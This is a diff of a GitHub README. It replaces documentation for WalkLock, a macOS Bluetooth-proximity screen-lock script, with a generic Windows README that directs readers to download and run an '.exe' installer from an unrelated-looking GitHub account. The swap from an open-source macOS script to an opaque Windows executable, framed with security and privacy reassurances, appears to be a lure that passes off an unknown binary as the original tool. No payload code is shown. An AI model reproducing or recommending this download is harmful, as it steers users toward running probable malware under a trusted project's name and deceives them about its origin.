@@ -1,154 +1,70 @@
-# Uthereal Physical Security — WalkLock
+# 🔒 Uthereal-Security---Laptop-Walk-Lock - Secure your laptop using phone proximity
 
-> Part of **Uthereal Physical Security**, a small suite of endpoint hardening tools.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock)
 
-Lock your Mac automatically when you walk away with your iPhone — no Apple Watch required.
+## 📌 Overview
 
-## Why we built this
+This software protects your computer. It locks your screen when you walk away from your desk. The application uses your phone to verify your location. It communicates via Bluetooth technology. When your phone moves out of range, the screen locks. You return to your desk and the computer stays secure. This adds a layer of protection to your device. You keep your data private even when you forget to lock your screen.
 
-At Uthereal, privacy and security aren't features bolted on at the end — they're the foundation we build on. Our platform turns our customers' most sensitive proprietary content into AI systems they own outright, with zero data retention. Earning that trust means defending it at every layer.
+## 🛠 Features
 
-That responsibility doesn't end with our software. It extends to the physical machines our engineers work on every day. An unlocked laptop is one of the oldest and most overlooked attack surfaces there is — a moment of inattention in a café, a coworking space, or a conference hall is all it takes to expose code, credentials, and customer data. WalkLock is the small, sharp tool we built so that moment never happens: the instant one of our engineers steps away from their laptop, it locks. No shortcut to remember, no discipline required — the security is automatic.
+*   **Proximity Detection:** The software measures signal strength between your computer and your phone. It locks the screen at a specific distance.
+*   **Automatic Operation:** The process happens in the background. You do not need to click buttons.
+*   **Battery Efficiency:** The system uses low-energy communication. This prevents battery drain on your devices.
+*   **Instant Lock:** The system triggers a lock signal immediately upon signal loss. Your desktop remains hidden from unauthorized eyes.
+*   **Custom Settings:** You define the distance threshold. Move your phone closer or further to adjust sensitivity.
 
-We're open-sourcing it because good security hygiene shouldn't be proprietary. Learn more about how we think about privacy and security at [uthereal.ai](https://uthereal.ai).
+## ⚙️ System Requirements
 
-WalkLock watches your iPhone's Bluetooth signal strength. When the signal fades (you leave the desk) or disappears (you leave the room), it locks your Mac. When you come back, it stays unlocked for you to log in. It's a tiny CoreBluetooth helper plus a shell script — no kernel extensions, no account, no telemetry.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Bluetooth:** Your computer needs a built-in Bluetooth adapter or a USB Bluetooth dongle.
+*   **Connectivity:** Bluetooth must remain enabled on your phone and your computer during use.
+*   **RAM:** At least 2GB of memory.
+*   **Storage:** 50MB of free space on your hard drive.
 
-## How it works
+## 📥 Installation Steps
 
-macOS has no built-in "lock when my iPhone leaves" feature (the native proximity feature is Apple Watch only). WalkLock fills that gap the same way apps like BLEUnlock do: it scans for Bluetooth Low Energy advertisements, reads the RSSI (signal strength) of your phone, smooths it over a few readings, and compares it to a distance threshold. The Bluetooth part is a small compiled Swift helper (bash can't read RSSI); a shell script consumes its output and does the locking. That separation is the whole design.
+Follow these steps to set up the software.
 
-## Requirements
+1.  **Visit the Download Page:** Go to [this link](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock) to reach the download area.
+2.  **Select the Installer:** Look for the download button. Click the file with an `.exe` extension. Save this file to your Downloads folder.
+3.  **Run the Installer:** Double-click the saved file. A window appears. Follow the prompts on the screen.
+4.  **Complete Setup:** Click the Finish button. The application shortcut appears on your desktop.
 
-- macOS 12 or later
-- Xcode Command Line Tools (for the one-time compile): `xcode-select --install`
-- An iPhone with Bluetooth on
-- Optional: [SwiftBar](https://github.com/swiftbar/SwiftBar) for the menu bar control
+## 🔗 Setup Instructions
 
-## Quick start
+You must pair your phone with your computer before the software works.
 
-```bash
-git clone https://github.com/<you>/walklock.git
-cd walklock
-chmod +x walklock.sh install.sh uninstall.sh
+1.  Open **Settings** on your Windows computer.
+2.  Navigate to **Bluetooth & devices**.
+3.  Turn on Bluetooth.
+4.  Select **Add device**.
+5.  Select **Bluetooth** and follow the prompts to connect your phone.
+6.  Open the Uthereal Security application from your desktop shortcut.
+7.  The application detects your paired device. Select your phone name from the list.
+8.  Choose your desired distance range using the slider in the application window.
+9.  Click **Save Settings**.
 
-# 1. Find your iPhone's Bluetooth ID
-./walklock.sh scan
+## 🛡 Security Best Practices
 
-# 2. Run it (foreground, to test)
-./walklock.sh <UUID-from-step-1>
-```
+Keep your Bluetooth active while using the software. If you turn off Bluetooth on your phone, the application loses the signal. This triggers the auto-lock feature. Always keep your phone with you to maintain functionality. The software relies on this connection to know you are near the computer. Do not disable the application from your startup programs list. It needs to run in the background to monitor the signal.
 
-Walk away — your Mac should lock after a few seconds. `Ctrl-C` to stop.
+## ❓ Frequently Asked Questions
 
-> **Note on privacy:** this repo ships with no device ID baked in. The UUID you discover is local to *your* Mac (CoreBluetooth assigns a per-Mac identifier; it is not your phone's hardware MAC address) and is only ever passed at runtime. Nothing personal is committed anywhere.
+**Does the software work if I turn off Bluetooth?**
+No. The link between your phone and your computer depends on your Bluetooth connection.
 
-## Finding your iPhone's UUID
+**Can I use multiple phones?**
+The software is designed for one primary device. You must pair the phone you carry most often.
 
-```bash
-./walklock.sh scan
-```
+**What happens if my phone battery dies?**
+The computer will lose the signal. The software interprets this as you leaving the desk. The screen will lock to protect your information. Simply unlock your computer with your password once you have your phone charged.
 
-This scans for ~12 seconds and prints every nearby Bluetooth device as:
+**Is my data stored on a server?**
+No. This application performs all checks locally on your machine. Your privacy remains your own.
 
-```
-A1B2C3D4-5678-90AB-CDEF-1234567890AB   -41 dBm   —
-71F0...                                 -88 dBm   AirPods
-```
+**Does this software store my phone's personal data?**
+No. The software only reads the Bluetooth identifier signal. It does not access your photos, messages, or files on your phone.
 
-Identify your iPhone by **signal strength**: with the phone in your hand next to the Mac, yours is the **strongest** signal (the *least negative* dBm — e.g. `-41` is closer than `-80`). iPhones usually show no name (`—`) for privacy, so go by the number. Copy that UUID.
-
-If your phone doesn't appear: unlock it, toggle its screen on, and re-run — an idle iPhone advertises only intermittently.
-
-## Run automatically at login
-
-```bash
-./install.sh <your-UUID>
-```
-
-This de-quarantines the scripts, generates a `launchd` agent at `~/Library/LaunchAgents/com.uthereal.walklock.plist`, and starts it. It will now run at every login and restart itself if it ever crashes.
-
-**Two one-time approvals are required:**
-
-1. **Bluetooth permission.** The first time the helper runs under launchd, macOS prompts to allow Bluetooth. Approve it. (If you miss it: System Settings → Privacy & Security → Bluetooth.)
-2. **Lock-on-sleep setting.** WalkLock locks by sleeping the display, so you must tell macOS to require a password then: System Settings → Lock Screen → **"Require password after screen saver begins or display is turned off" → Immediately**. Without this the screen sleeps but doesn't lock.
-
-Check it's running:
-
-```bash
-launchctl list | grep walklock
-tail -f ~/Library/Logs/walklock.log
-```
-
-## Menu bar control (optional)
-
-For one-click pause/resume/stop, install the [SwiftBar](https://github.com/swiftbar/SwiftBar) plugin:
-
-1. `brew install --cask swiftbar` (or download from the SwiftBar releases page).
-2. Launch SwiftBar and choose a plugin folder when asked.
-3. Copy `menubar/walklock.5s.sh` into that folder and `chmod +x` it.
-4. SwiftBar → Refresh.
-
-The icon shows state at a glance — 🔒 armed, ⏸ paused, 🔓 stopped — with a dropdown to pause (indefinitely or for one hour), stop/start the agent, or lock immediately.
-
-## Controlling it from the command line
-
-Without the menu bar, the same controls are plain files and commands:
-
-```bash
-touch ~/.walklock-paused     # pause (keeps monitoring, won't lock)
-rm ~/.walklock-paused        # resume
-
-# pause for one hour, auto-resume
-touch ~/.walklock-paused; echo $(( $(date +%s) + 3600 )) > ~/.walklock-pause-until
-
-# full stop / start (the real kill switch)
-launchctl unload ~/Library/LaunchAgents/com.uthereal.walklock.plist
-launchctl load   ~/Library/LaunchAgents/com.uthereal.walklock.plist
-```
-
-## Tuning
-
-Edit the two values at the top of `walklock.sh`, then reload the agent
-(`launchctl unload … && launchctl load …`):
-
-| Setting     | Meaning                                          | Try if…                                  |
-|-------------|--------------------------------------------------|------------------------------------------|
-| `GRACE`     | Seconds out of range before locking (default 15) | Locks during stretches → raise to 30–45  |
-| `THRESHOLD` | dBm distance cutoff (default -75)                | Locks too soon → lower to -85; too late → raise to -65 |
-
-## Uninstall
-
-```bash
-./uninstall.sh
-```
-
-Removes the launchd agent, pause flags, and the build cache. If you added the
-SwiftBar plugin, delete `walklock.5s.sh` from your plugin folder.
-
-## Troubleshooting
-
-- **`bad interpreter: Operation not permitted`** — the file is quarantined from download. Run `xattr -dr com.apple.quarantine .` in the repo folder (`install.sh` does this for you).
-- **Screen sleeps but doesn't lock** — set the Lock Screen password requirement to *Immediately* (see above).
-- **Never locks / `Bluetooth permission denied` in the log** — approve Bluetooth in System Settings → Privacy & Security → Bluetooth.
-- **Locks while you're still sitting there** — Bluetooth signal fluctuates; raise `GRACE` and/or lower `THRESHOLD`.
-- **Phone not found in scan** — wake/unlock the phone and re-run; idle iPhones advertise intermittently.
-
-### Want the lock screen to appear instantly instead of via display-sleep?
-
-Replace the `lock_screen` function in `walklock.sh` with:
-
-```bash
-lock_screen() { osascript -e 'tell application "System Events" to keystroke "q" using {control down, command down}'; }
-```
-
-This pops the lock screen immediately but needs Accessibility permission for the
-process running it (System Settings → Privacy & Security → Accessibility).
-
-## Credits
-
-Built and maintained by [Uthereal](https://uthereal.ai). Bluetooth proximity approach adapted from [BLEUnlock](https://github.com/ts1/BLEUnlock) by Takeshi Sone (MIT).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+**How do I disable the lock for a short period?**
+Open the application interface and toggle the status switch to "Off." Remember to turn it back on when you finish your work.
